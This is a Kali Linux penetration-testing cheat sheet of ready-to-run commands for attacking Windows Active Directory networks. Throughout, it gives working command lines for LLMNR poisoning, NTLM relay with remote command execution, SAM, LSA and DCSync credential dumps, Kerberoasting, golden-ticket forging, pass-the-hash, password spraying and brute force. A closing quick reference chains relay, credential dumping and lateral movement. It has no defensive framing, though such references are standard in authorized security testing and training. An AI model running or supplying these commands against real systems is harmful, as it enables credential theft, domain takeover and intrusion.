# PHANTOM Tools Reference — Kali Linux

> *"Every protocol has a tool. Every tool has a purpose."*

## Network Scanning

### nmap (Network Mapper)
**Source**: https://nmap.org/

```bash
# Host discovery
nmap -sn 192.168.1.0/24 -oA network/hosts

# TCP SYN scan
sudo nmap -sS -T4 $TARGET -oA network/syn

# Full port scan
nmap -p- -T4 $TARGET -oA network/fullport

# Service version detection
nmap -sV -sC $TARGET -oA network/services

# OS detection
sudo nmap -O $TARGET -oA network/os

# UDP scan
sudo nmap -sU --top-ports 100 $TARGET -oA network/udp

# SMB enumeration scripts
nmap --script smb-enum-shares,smb-enum-users -p445 $TARGET

# Vulnerability scan
nmap --script vuln $TARGET -oA network/vuln
```

### masscan
**Source**: https://github.com/robertdavidgraham/masscan

```bash
# Fast full port scan
sudo masscan -p1-65535 $TARGET --rate=1000 -oG network/masscan.gnmap

# Specific ports
sudo masscan -p21,22,23,25,80,443,445,3389 $TARGET --rate=500
```

## SMB Enumeration

### enum4linux-ng
**Source**: https://github.com/cddmp/enum4linux-ng

```bash
# Full enumeration
enum4linux-ng -A $TARGET -oA network/enum4linux

# User enumeration
enum4linux-ng -U $TARGET

# Share enumeration
enum4linux-ng -S $TARGET

# With credentials
enum4linux-ng -u username -p password -A $TARGET
```

### smbclient
```bash
# List shares (anonymous)
smbclient -L //$TARGET -N

# Connect to share
smbclient //$TARGET/share -N

# With credentials
smbclient //$TARGET/share -U username%password

# Download all files
smbclient //$TARGET/share -U username%password -c "recurse ON; prompt OFF; mget *"
```

### smbmap
```bash
# Enumerate shares
smbmap -H $TARGET

# With credentials
smbmap -H $TARGET -u username -p password

# List contents
smbmap -H $TARGET -u username -p password -r share

# Download file
smbmap -H $TARGET -u username -p password --download 'share\file.txt'
```

## LLMNR/NBT-NS Poisoning

### Responder
**Source**: https://github.com/lgandx/Responder

```bash
# Basic poisoning
sudo responder -I eth0

# With WPAD
sudo responder -I eth0 -wrf

# Analyze mode (no poisoning)
sudo responder -I eth0 -A

# View captured hashes
cat /usr/share/responder/logs/SMB*.txt
```

## SMB Relay

### ntlmrelayx (Impacket)
**Source**: https://github.com/fortra/impacket

```bash
# Relay to target
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Relay with command execution
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP for delegation
sudo ntlmrelayx.py -t ldap://$DC -smb2support --delegate-access

# Relay to dump SAM
sudo ntlmrelayx.py -tf targets.txt -smb2support --dump-laps

# With responder (disable SMB in responder first)
# Edit /etc/responder/Responder.conf: SMB = Off
sudo responder -I eth0 -r -d -w
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

## Impacket Tools

### psexec.py
```bash
# Execute commands via SMB
psexec.py domain/user:password@$TARGET

# With hash
psexec.py -hashes :NTLM_HASH domain/user@$TARGET
```

### wmiexec.py
```bash
# WMI execution
wmiexec.py domain/user:password@$TARGET

# Semi-interactive shell
wmiexec.py domain/user:password@$TARGET "whoami"
```

### smbexec.py
```bash
# SMB execution (no disk write)
smbexec.py domain/user:password@$TARGET
```

### secretsdump.py
```bash
# Dump secrets locally
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Remote dump
secretsdump.py domain/user:password@$TARGET

# DCSync
secretsdump.py -just-dc domain/user:password@$DC

# DCSync specific user
secretsdump.py -just-dc-user krbtgt domain/user:password@$DC
```

### GetUserSPNs.py (Kerberoasting)
```bash
# Find SPNs and request TGS
GetUserSPNs.py domain/user:password -dc-ip $DC -request

# Output to file
GetUserSPNs.py domain/user:password -dc-ip $DC -request -outputfile kerberoast.txt

# Specific user
GetUserSPNs.py domain/user:password -dc-ip $DC -request -target-user svc_account
```

### GetNPUsers.py (AS-REP Roasting)
```bash
# Find AS-REP vulnerable users
GetNPUsers.py domain/ -usersfile users.txt -dc-ip $DC -no-pass

# With credentials
GetNPUsers.py domain/user:password -dc-ip $DC

# Request AS-REP
GetNPUsers.py domain/ -usersfile users.txt -dc-ip $DC -format hashcat
```

### getTGT.py
```bash
# Request TGT
getTGT.py domain/user:password -dc-ip $DC

# With hash
getTGT.py -hashes :NTLM_HASH domain/user -dc-ip $DC
```

### ticketer.py (Golden/Silver Tickets)
```bash
# Golden Ticket
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN administrator

# Silver Ticket
ticketer.py -nthash $SERVICE_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET.$DOMAIN user
```

## CrackMapExec / NetExec

### netexec (CME replacement)
**Source**: https://github.com/Pennyw0rth/NetExec

```bash
# SMB enumeration
netexec smb $TARGET

# Check credentials
netexec smb $TARGET -u user -p password

# Enumerate shares
netexec smb $TARGET -u user -p password --shares

# Enumerate users
netexec smb $TARGET -u user -p password --users

# Password spray
netexec smb $TARGET -u users.txt -p password --continue-on-success

# Execute command
netexec smb $TARGET -u user -p password -x "whoami"

# Dump SAM
netexec smb $TARGET -u user -p password --sam

# Dump LSA
netexec smb $TARGET -u user -p password --lsa

# Pass-the-hash
netexec smb $TARGET -u user -H NTLM_HASH

# Kerberoasting
netexec ldap $DC -u user -p password --kerberoasting output.txt

# AS-REP Roasting
netexec ldap $DC -u user -p password --asreproast output.txt
```

## BloodHound

### SharpHound (Collection)
```bash
# Using bloodhound-python
bloodhound-python -d domain.local -u user -p password -ns $DC -c All

# Output to specific folder
bloodhound-python -d domain.local -u user -p password -ns $DC -c All --zip
```

### Analysis
```bash
# Start Neo4j
sudo neo4j console

# Start BloodHound
bloodhound

# Import data: drag and drop zip file
# Run queries in GUI
```

## Credential Cracking

### hashcat
```bash
# NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberos TGS (Kerberoast)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberos AS-REP
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### john
```bash
# Auto-detect format
john hashes.txt

# Specific format
john --format=netntlmv2 hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Kerberos Tools

### kerbrute
**Source**: https://github.com/ropnop/kerbrute

```bash
# User enumeration
kerbrute userenum -d domain.local users.txt --dc $DC

# Password spray
kerbrute passwordspray -d domain.local users.txt 'Password123' --dc $DC

# Brute force
kerbrute bruteuser -d domain.local passwords.txt username --dc $DC
```

## Network Utilities

### tcpdump
```bash
# Capture all traffic
sudo tcpdump -i eth0 -w capture.pcap

# Filter by host
sudo tcpdump -i eth0 host $TARGET

# Filter by port
sudo tcpdump -i eth0 port 445
```

### netcat
```bash
# Banner grab
nc -nv $TARGET 21

# Listen
nc -lvnp 4444

# Connect
nc -nv $TARGET 4444
```

### hydra
```bash
# SSH brute force
hydra -l user -P passwords.txt ssh://$TARGET

# SMB brute force
hydra -l user -P passwords.txt smb://$TARGET

# RDP brute force
hydra -l user -P passwords.txt rdp://$TARGET
```

## Quick Reference

```bash
# Quick AD enum
netexec smb $DC -u user -p password --users --groups --shares

# Quick Kerberoast
GetUserSPNs.py domain/user:password -dc-ip $DC -request

# Quick relay setup
sudo responder -I eth0 & ntlmrelayx.py -tf targets.txt

# Quick credential dump
secretsdump.py domain/user:password@$TARGET

# Quick lateral movement
psexec.py domain/user:password@$TARGET
```
